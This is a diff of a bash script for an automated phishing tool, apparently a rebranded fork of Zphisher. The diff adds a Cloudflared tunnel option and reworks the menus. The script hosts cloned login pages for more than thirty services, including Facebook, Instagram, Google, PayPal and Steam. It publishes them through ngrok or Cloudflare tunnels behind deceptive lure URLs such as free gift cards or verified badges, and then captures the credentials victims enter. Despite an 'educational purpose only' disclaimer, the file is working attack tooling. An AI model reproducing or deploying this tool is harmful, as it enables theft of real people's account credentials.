@@ -1,15 +1,18 @@
 #!/bin/bash
 
-##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	BhuShan
-##   Version 	: 	2.1
-##   Github 	: 	https://github.com/BhuShan-18/BHXPhisherTool
+##  BhuShanPhishingTool	: 	Automated Phishing Tool
+##   Author 	: 	BhuShan Pawar
+##   Version 	: 	3.0
+##   Github 	: 	https://github.com/BhuShan-18
 
 ##   THANKS TO :
 ##   Me -https://www.instagram.com/16oct.01/
 ##   Abhishek Undge - https://instagram.com/abhishek.undge/
 ##   Kishor Masulkar -https://www.instagram.com/kishor_masulkar45/
 ##   Bhushan Deshmukh -https://www.instagram.com/bhushan_deshmukh45/
+
+
+
 
 ## If you Copy Then Give the credits :)
 
@@ -85,7 +88,7 @@
 ##    The precise terms and conditions for copying, distribution and
 ##    modification follow.
 ##
-##      Copyright (C) 2021  BhuShan Hacks Official (https://github.com/BhuShan-18/BHXPhisherTool)
+##      Copyright (C) 2021  Bhushan Hacks Official (https://github.com/BhuShan-18)
 ##
 
 
@@ -105,6 +108,9 @@ if [[ -d ".server/www" ]]; then
 	mkdir -p ".server/www"
 else
 	mkdir -p ".server/www"
+fi
+if [[ -e ".cld.log" ]]; then
+	rm -rf ".cld.log"
 fi
 
 ## Script termination
@@ -135,7 +141,10 @@ kill_pid() {
 	fi
 	if [[ `pidof ngrok` ]]; then
 		killall ngrok > /dev/null 2>&1
-	fi	
+	fi
+	if [[ `pidof cloudflared` ]]; then
+		killall cloudflared > /dev/null 2>&1
+	fi
 }
 
 ## Banner
@@ -200,7 +209,7 @@ dependencies() {
 			type -p "$pkg" &>/dev/null || {
 				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
 				if [[ `command -v pkg` ]]; then
-					pkg install "$pkg"
+					pkg install "$pkg" -y
 				elif [[ `command -v apt` ]]; then
 					apt install "$pkg" -y
 				elif [[ `command -v apt-get` ]]; then
@@ -238,6 +247,23 @@ download_ngrok() {
 	fi
 }
 
+## Download Cloudflared
+download_cloudflared() {
+	url="$1"
+	file=`basename $url`
+	if [[ -e "$file" ]]; then
+		rm -rf "$file"
+	fi
+	wget --no-check-certificate "$url" > /dev/null 2>&1
+	if [[ -e "$file" ]]; then
+		mv -f "$file" .server/cloudflared > /dev/null 2>&1
+		chmod +x .server/cloudflared > /dev/null 2>&1
+	else
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Cloudflared manually."
+		{ reset_color; exit 1; }
+	fi
+}
+
 ## Install ngrok
 install_ngrok() {
 	if [[ -e ".server/ngrok" ]]; then
@@ -258,6 +284,26 @@ install_ngrok() {
 
 }
 
+## Install Cloudflared
+install_cloudflared() {
+	if [[ -e ".server/cloudflared" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
+	else
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
+		else
+			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
+		fi
+	fi
+
+}
+
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
@@ -272,10 +318,14 @@ about() {
 		${GREEN}Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
 		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/htr-tech
 		${GREEN}Social   ${RED}:  ${CYAN}https://linktr.ee/tahmid.rayat
-		${GREEN}Version  ${RED}:  ${ORANGE}2.1
+		${GREEN}Version  ${RED}:  ${ORANGE}2.2
 
 		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,ThelinuxChoice
-								  DarkSecDevelopers,Mustakim Ahmed ${RESETBG}
+								  DarkSecDevelopers,Mustakim Ahmed,1RaY-1 ${RESETBG}
+
+		${RED}Warning:${WHITE}
+		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
+		${CYAN}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}
 
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
@@ -283,15 +333,16 @@ about() {
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
-	if [[ "$REPLY" == 99 ]]; then
-		msg_exit
-	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
-		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
-		{ sleep 1; main_menu; }
-	else
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; about; }
-	fi
+	case $REPLY in 
+		99)
+			msg_exit;;
+		0 | 00)
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
+			{ sleep 1; main_menu; };;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; about; };;
+	esac
 }
 
 ## Setup website and start php server
@@ -359,10 +410,34 @@ start_ngrok() {
     fi
 
 	{ sleep 8; clear; banner_small; }
-	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
+	capture_data
+}
+
+
+## DON'T COPY PASTE WITHOUT CREDIT DUDE :')
+
+## Start Cloudflared
+start_cloudflared() { 
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	{ sleep 1; setup_site; }
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
+
+    if [[ `command -v termux-chroot` ]]; then
+		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+    else
+        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
+    fi
+
+	{ sleep 8; clear; banner_small; }
+	
+	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
+	cldflr_link1=${cldflr_link#https://}
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
 	capture_data
 }
 
@@ -380,21 +455,25 @@ tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Localhost ${RED}[${CYAN}For Devs${RED}]
-		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io  ${RED}[${CYAN}Best${RED}]
+		${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]
+		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Buggy${RED}]
+		${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}NEW!${RED}]
 
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
 
-	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		start_localhost
-	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		start_ngrok
-	else
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; tunnel_menu; }
-	fi
+	case $REPLY in 
+		1 | 01)
+			start_localhost;;
+		2 | 02)
+			start_ngrok;;
+		3 | 03)
+			start_cloudflared;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; tunnel_menu; };;
+	esac
 }
 
 ## Facebook
@@ -410,26 +489,27 @@ site_facebook() {
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
-	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		website="facebook"
-		mask='http://blue-verified-badge-for-facebook-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		website="fb_advanced"
-		mask='http://vote-for-the-best-social-media'
-		tunnel_menu
-	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
-		website="fb_security"
-		mask='http://make-your-facebook-secured-and-free-from-hackers'
-		tunnel_menu
-	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
-		website="fb_messenger"
-		mask='http://get-messenger-premium-features-free'
-		tunnel_menu
-	else
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_facebook; }
-	fi
+	case $REPLY in 
+		1 | 01)
+			website="facebook"
+			mask='http://blue-verified-badge-for-facebook-free'
+			tunnel_menu;;
+		2 | 02)
+			website="fb_advanced"
+			mask='http://vote-for-the-best-social-media'
+			tunnel_menu;;
+		3 | 03)
+			website="fb_security"
+			mask='http://make-your-facebook-secured-and-free-from-hackers'
+			tunnel_menu;;
+		4 | 04)
+			website="fb_messenger"
+			mask='http://get-messenger-premium-features-free'
+			tunnel_menu;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; clear; banner_small; site_facebook; };;
+	esac
 }
 
 ## Instagram
@@ -445,26 +525,27 @@ site_instagram() {
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
-	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		website="instagram"
-		mask='http://get-unlimited-followers-for-instagram'
-		tunnel_menu
-	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		website="ig_followers"
-		mask='http://get-unlimited-followers-for-instagram'
-		tunnel_menu
-	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
-		website="insta_followers"
-		mask='http://get-1000-followers-for-instagram'
-		tunnel_menu
-	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
-		website="ig_verify"
-		mask='http://blue-badge-verify-for-instagram-free'
-		tunnel_menu
-	else
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_instagram; }
-	fi
+	case $REPLY in 
+		1 | 01)
+			website="instagram"
+			mask='http://get-unlimited-followers-for-instagram'
+			tunnel_menu;;
+		2 | 02)
+			website="ig_followers"
+			mask='http://get-unlimited-followers-for-instagram'
+			tunnel_menu;;
+		3 | 03)
+			website="insta_followers"
+			mask='http://get-1000-followers-for-instagram'
+			tunnel_menu;;
+		4 | 04)
+			website="ig_verify"
+			mask='http://blue-badge-verify-for-instagram-free'
+			tunnel_menu;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; clear; banner_small; site_instagram; };;
+	esac
 }
 
 ## Gmail/Google
@@ -479,22 +560,23 @@ site_gmail() {
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
-	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		website="google"
-		mask='http://get-unlimited-google-drive-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		website="google_new"
-		mask='http://get-unlimited-google-drive-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
-		website="google_poll"
-		mask='http://vote-for-the-best-social-media'
-		tunnel_menu
-	else
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_gmail; }
-	fi
+	case $REPLY in 
+		1 | 01)
+			website="google"
+			mask='http://get-unlimited-google-drive-free'
+			tunnel_menu;;		
+		2 | 02)
+			website="google_new"
+			mask='http://get-unlimited-google-drive-free'
+			tunnel_menu;;
+		3 | 03)
+			website="google_poll"
+			mask='http://vote-for-the-best-social-media'
+			tunnel_menu;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; clear; banner_small; site_gmail; };;
+	esac
 }
 
 ## Vk
@@ -508,18 +590,19 @@ site_vk() {
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
-	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		website="vk"
-		mask='http://vk-premium-real-method-2020'
-		tunnel_menu
-	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		website="vk_poll"
-		mask='http://vote-for-the-best-social-media'
-		tunnel_menu
-	else
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_vk; }
-	fi
+	case $REPLY in 
+		1 | 01)
+			website="vk"
+			mask='http://vk-premium-real-method-2020'
+			tunnel_menu;;
+		2 | 02)
+			website="vk_poll"
+			mask='http://vote-for-the-best-social-media'
+			tunnel_menu;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; clear; banner_small; site_vk; };;
+	esac
 }
 
 ## Menu
@@ -546,142 +629,145 @@ main_menu() {
 	
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
-	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		site_facebook
-	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		site_instagram
-	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
-		site_gmail
-	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
-		website="microsoft"
-		mask='http://unlimited-onedrive-space-for-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 5 || "$REPLY" == 05 ]]; then
-		website="netflix"
-		mask='http://upgrade-your-netflix-plan-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 6 || "$REPLY" == 06 ]]; then
-		website="paypal"
-		mask='http://get-500-usd-free-to-your-acount'
-		tunnel_menu
-	elif [[ "$REPLY" == 7 || "$REPLY" == 07 ]]; then
-		website="steam"
-		mask='http://steam-500-usd-gift-card-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 8 || "$REPLY" == 08 ]]; then
-		website="twitter"
-		mask='http://get-blue-badge-on-twitter-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 9 || "$REPLY" == 09 ]]; then
-		website="playstation"
-		mask='http://playstation-500-usd-gift-card-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 10 ]]; then
-		website="tiktok"
-		mask='http://tiktok-free-liker'
-		tunnel_menu
-	elif [[ "$REPLY" == 11 ]]; then
-		website="twitch"
-		mask='http://unlimited-twitch-tv-user-for-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 12 ]]; then
-		website="pinterest"
-		mask='http://get-a-premium-plan-for-pinterest-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 13 ]]; then
-		website="snapchat"
-		mask='http://view-locked-snapchat-accounts-secretly'
-		tunnel_menu
-	elif [[ "$REPLY" == 14 ]]; then
-		website="linkedin"
-		mask='http://get-a-premium-plan-for-linkedin-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 15 ]]; then
-		website="ebay"
-		mask='http://get-500-usd-free-to-your-acount'
-		tunnel_menu
-	elif [[ "$REPLY" == 16 ]]; then
-		website="quora"
-		mask='http://quora-premium-for-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 17 ]]; then
-		website="protonmail"
-		mask='http://protonmail-pro-basics-for-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 18 ]]; then
-		website="spotify"
-		mask='http://convert-your-account-to-spotify-premium'
-		tunnel_menu
-	elif [[ "$REPLY" == 19 ]]; then
-		website="reddit"
-		mask='http://reddit-official-verified-member-badge'
-		tunnel_menu
-	elif [[ "$REPLY" == 20 ]]; then
-		website="adobe"
-		mask='http://get-adobe-lifetime-pro-membership-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 21 ]]; then
-		website="deviantart"
-		mask='http://get-500-usd-free-to-your-acount'
-		tunnel_menu
-	elif [[ "$REPLY" == 22 ]]; then
-		website="badoo"
-		mask='http://get-500-usd-free-to-your-acount'
-		tunnel_menu
-	elif [[ "$REPLY" == 23 ]]; then
-		website="origin"
-		mask='http://get-500-usd-free-to-your-acount'
-		tunnel_menu
-	elif [[ "$REPLY" == 24 ]]; then
-		website="dropbox"
-		mask='http://get-1TB-cloud-storage-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 25 ]]; then
-		website="yahoo"
-		mask='http://grab-mail-from-anyother-yahoo-account-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 26 ]]; then
-		website="wordpress"
-		mask='http://unlimited-wordpress-traffic-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 27 ]]; then
-		website="yandex"
-		mask='http://grab-mail-from-anyother-yandex-account-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 28 ]]; then
-		website="stackoverflow"
-		mask='http://get-stackoverflow-lifetime-pro-membership-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 29 ]]; then
-		site_vk
-	elif [[ "$REPLY" == 30 ]]; then
-		website="xbox"
-		mask='http://get-500-usd-free-to-your-acount'
-		tunnel_menu
-	elif [[ "$REPLY" == 31 ]]; then
-		website="mediafire"
-		mask='http://get-1TB-on-mediafire-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 32 ]]; then
-		website="gitlab"
-		mask='http://get-1k-followers-on-gitlab-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 33 ]]; then
-		website="github"
-		mask='http://get-1k-followers-on-github-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 99 ]]; then
-		about
-	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
-		msg_exit
-	else
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; main_menu; }
-	fi
+	case $REPLY in 
+		1 | 01)
+			site_facebook;;
+		2 | 02)
+			site_instagram;;
+		3 | 03)
+			site_gmail;;
+		4 | 04)
+			website="microsoft"
+			mask='http://unlimited-onedrive-space-for-free'
+			tunnel_menu;;
+		5 | 05)
+			website="netflix"
+			mask='http://upgrade-your-netflix-plan-free'
+			tunnel_menu;;
+		6 | 06)
+			website="paypal"
+			mask='http://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		7 | 07)
+			website="steam"
+			mask='http://steam-500-usd-gift-card-free'
+			tunnel_menu;;
+		8 | 08)
+			website="twitter"
+			mask='http://get-blue-badge-on-twitter-free'
+			tunnel_menu;;
+		9 | 09)
+			website="playstation"
+			mask='http://playstation-500-usd-gift-card-free'
+			tunnel_menu;;
+		10)
+			website="tiktok"
+			mask='http://tiktok-free-liker'
+			tunnel_menu;;
+		11)
+			website="twitch"
+			mask='http://unlimited-twitch-tv-user-for-free'
+			tunnel_menu;;
+		12)
+			website="pinterest"
+			mask='http://get-a-premium-plan-for-pinterest-free'
+			tunnel_menu;;
+		13)
+			website="snapchat"
+			mask='http://view-locked-snapchat-accounts-secretly'
+			tunnel_menu;;
+		14)
+			website="linkedin"
+			mask='http://get-a-premium-plan-for-linkedin-free'
+			tunnel_menu;;
+		15)
+			website="ebay"
+			mask='http://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		16)
+			website="quora"
+			mask='http://quora-premium-for-free'
+			tunnel_menu;;
+		17)
+			website="protonmail"
+			mask='http://protonmail-pro-basics-for-free'
+			tunnel_menu;;
+		18)
+			website="spotify"
+			mask='http://convert-your-account-to-spotify-premium'
+			tunnel_menu;;
+		19)
+			website="reddit"
+			mask='http://reddit-official-verified-member-badge'
+			tunnel_menu;;
+		20)
+			website="adobe"
+			mask='http://get-adobe-lifetime-pro-membership-free'
+			tunnel_menu;;
+		21)
+			website="deviantart"
+			mask='http://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		22)
+			website="badoo"
+			mask='http://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		23)
+			website="origin"
+			mask='http://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		24)
+			website="dropbox"
+			mask='http://get-1TB-cloud-storage-free'
+			tunnel_menu;;
+		25)
+			website="yahoo"
+			mask='http://grab-mail-from-anyother-yahoo-account-free'
+			tunnel_menu;;
+		26)
+			website="wordpress"
+			mask='http://unlimited-wordpress-traffic-free'
+			tunnel_menu;;
+		27)
+			website="yandex"
+			mask='http://grab-mail-from-anyother-yandex-account-free'
+			tunnel_menu;;
+		28)
+			website="stackoverflow"
+			mask='http://get-stackoverflow-lifetime-pro-membership-free'
+			tunnel_menu;;
+		29)
+			site_vk;;
+		30)
+			website="xbox"
+			mask='http://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		31)
+			website="mediafire"
+			mask='http://get-1TB-on-mediafire-free'
+			tunnel_menu;;
+		32)
+			website="gitlab"
+			mask='http://get-1k-followers-on-gitlab-free'
+			tunnel_menu;;
+		33)
+			website="github"
+			mask='http://get-1k-followers-on-github-free'
+			tunnel_menu;;
+		99)
+			about;;
+		0 | 00 )
+			msg_exit;;
+		*)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; main_menu; };;
+	
+	esac
 }
 
 ## Main
 kill_pid
 dependencies
 install_ngrok
+install_cloudflared
 main_menu
